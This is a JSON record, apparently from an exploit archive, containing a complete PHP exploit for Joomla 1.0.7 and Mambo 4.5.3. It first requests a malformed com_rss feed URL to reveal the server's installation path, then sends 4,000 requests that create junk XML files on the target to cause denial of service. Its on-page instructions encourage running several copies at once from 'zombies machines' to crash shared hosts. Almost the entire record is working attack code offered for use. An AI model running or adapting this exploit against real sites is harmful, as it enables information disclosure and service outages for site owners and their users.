{
  "id": "1698",
  "title": "Joomla! 1.0.7 / Mambo 4.5.3 - &#039;feed&#039; Full Path Disclosure / Denial of Service",
  "cve": null,
  "vuln_type": "unknown",
  "code": "<?php\r\n#             Mambo/Joomla Path Disclosure & Remote DOS Exploit               #\r\n#                               by trueend5                                   #\r\n#              Computer Security Science Researchers Institute                #\r\n#                           [http://www.KAPDA.ir]                             #\r\n#                                                                             #\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 5);\r\nob_implicit_flush (1);\r\n\r\necho'<html>\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\">\r\n<title>Mambo/Joomla Remote DOS Exploit</title>\r\n</head>\r\n\r\n<body bgcolor=\"#FFCCFF\">\r\n\r\n<p align=\"center\"><font size=\"4\" color=\"#0000FF\">Mambo/Joomla Path Disclosure &\r\n(IIS Server-isapi mod) Remote Denial Of Service</font></p>\r\n<p class=\"Stile6\" align=\"center\"><font size=\"3\" color=\"#FF0000\">by trueend5</font></p>\r\n<p align=\"center\"><font size=\"4\" color=\"#008000\">Computer Security Science Researchers\r\nInstitute</font></p>\r\n<font SIZE=\"3\">\r\n<p align=\"center\"><a href=\"http://www.kapda.ir\">KAPDA</a></p>\r\n<p align=\"center\">&nbsp;</p>\r\n</font>\r\n<table width=\"90%\">\r\n  <tbody>\r\n    <tr>\r\n      <td width=\"43%\" align=\"left\">\r\n        <form name=\"form1\" action=\"'.$SERVER[PHP_SELF].'\" method=\"post\">\r\n          <p><input name=\"host\" size=\"20\"> <span class=\"Stile5\"><font color=\"#FF0000\">*</font> hostname (ex: www.sitename.com)</span></p>\r\n          <p><input name=\"path\" size=\"20\"> <span class=\"Stile5\"><font color=\"#FF0000\">*</font> path (ex:\r\n          /mambo/\r\n          or just / )</span></p>\r\n          <p><input name=\"pref\" size=\"20\"> <span class=\"Stile5\">prefix (default is\r\n\t\t\t\"kap\")</span></p>\r\n          <p>&nbsp;useful when you want to Run this script\r\n\t\t\ttwice or more at the same time against a target For DDOS.</p>\r\n\t\t\t<p>&nbsp; to perform it Just rename this file and choose a different\r\n\t\t\tprefix and run the exploits from your system ,</p>\r\n\t\t\t<p>&nbsp; remote locations or from&nbsp; zombies machines.</p>\r\n\t\t\t<p>&nbsp; (quintuplet or more is recommended to cause&nbsp; remote server\r\n\t\t\tcrash for a none dedicated host)</p>\r\n          <p><input name=\"port\" size=\"20\"><span class=\"Stile5\"> specify a port&nbsp;\r\n          (default is 80)</span></p>\r\n          <p><input name=\"proxy\" size=\"20\"><span class=\"Stile5\"> send exploit\r\n          through an HTTP proxy (ip:port)</span></p>\r\n          <p align=\"center\"> <span class=\"Stile5\"><font color=\"#FF0000\">&nbsp;&nbsp;\r\n          * </font>fields are required</span></p>\r\n          <p align=\"center\"><span class=\"Stile5\">-----------------------------------------------------------------------------------------------</span></p>\r\n\r\n          <p><input type=\"submit\" value=\"Start\" name=\"Submit\"></p>\r\n        </form>\r\n      </td>\r\n    </tr>\r\n  </tbody>\r\n</table>\r\n</body></html>';\r\n\r\nfunction show($headeri)\r\n{\r\n  $ii=0;$ji=0;$ki=0;$ci=0;\r\n  echo '<table border=\"0\"><tr>';\r\n  while ($ii <= strlen($headeri)-1){\r\n    $datai=dechex(ord($headeri[$ii]));\r\n    if ($ji==16) {\r\n      $ji=0;\r\n      $ci++;\r\n      echo \"<td>&nbsp;&nbsp;</td>\";\r\n      for ($li=0; $li<=15; $li++) {\r\n        echo \"<td>\".$headeri[$li+$ki].\"</td>\";\r\n\t\t}\r\n      $ki=$ki+16;\r\n      echo \"</tr><tr>\";\r\n    }\r\n    if (strlen($datai)==1) {\r\n      echo \"<td>0\".$datai.\"</td>\";\r\n    }\r\n    else {\r\n      echo \"<td>\".$datai.\"</td> \";\r\n    }\r\n    $ii++;$ji++;\r\n  }\r\n  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {\r\n    echo \"<td>&nbsp&nbsp</td>\";\r\n  }\r\n  for ($li=$ci*16; $li<=strlen($headeri); $li++) {\r\n    echo \"<td>\".$headeri[$li].\"</td>\";\r\n  }\r\n  echo \"</tr></table>\";\r\n}\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.htmlentities($host); die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n  //if ($GLOBALS['view']==1) {echo nl2br(htmlentities($html));}\r\n}\r\n\r\n$host=$_POST[host];\r\n$path=$_POST[path];\r\n$port=$_POST[port];\r\n$pref=$_POST[pref];\r\n\r\nif (($host<>'') and ($path<>'')){\r\n{\r\n  $port=intval(trim($port));\r\n  $pref=(trim($pref));\r\n  if ($port=='') {$port=80;}\r\n  if ($pref=='') {$pref='kap';}\r\n  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die('Error... check the path!');}\r\n  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n  $host=str_replace(\"\\r\\n\",\"\",$host);\r\n  $path=str_replace(\"\\r\\n\",\"\",$path);\r\n  echo ' Try to find installaton path ...';\r\n  $packet=\"GET \".$p.\"index2.php?option=com_rss&feed=test\\/>\".\" HTTP/1.1\\r\\n\";\r\n  $packet.=\"User-Agent: Shareaza v1.x.x.xx\\r\\n\";\r\n  $packet.=\"Host: \".$host.\"\\r\\n\";\r\n  $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n  show($packet);\r\n  sendpacketii($packet);\r\n  if (eregi(\"fopen\",$html)){\r\n  $arr = array(\"fopen(\",\"test\"); $rep = array(\"\\n\\n\\n\\nThe installation path is:\\n\",\"\\n\\n\\n\\n\");\r\n  $html = str_replace($arr, $rep, $html);\r\n  echo nl2br(htmlentities($html));} else\r\n  {echo \"error reporting is Off, Can not receive the installation path\";}\r\n }\r\n  echo \"try to create superfluous files on remote server: \\r\\n\";\r\n  for ($n = 1; $n <= 4000; $n++) {\r\n  $packet=\"GET \".$p.\"index2.php?option=com_rss&feed=\".$pref.$n.\" HTTP/1.1\\r\\n\";\r\n  $packet.=\"User-Agent: Shareaza v1.x.x.xx\\r\\n\";\r\n  $packet.=\"Host: \".$host.\"\\r\\n\";\r\n  $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n  sendpacketii($packet);\r\n  echo \"$pref$n.xml created|\\t\";\r\n  }\r\n  echo \"Exploit finished\";\r\n}\r\nelse\r\n{echo \"Note: if you received time exceeded error, run again the xpl with new prefix\";}\r\n\r\n?>\r\n\r\n# milw0rm.com [2006-04-19]",
  "url": "https://www.exploit-db.com/exploits/1698"
}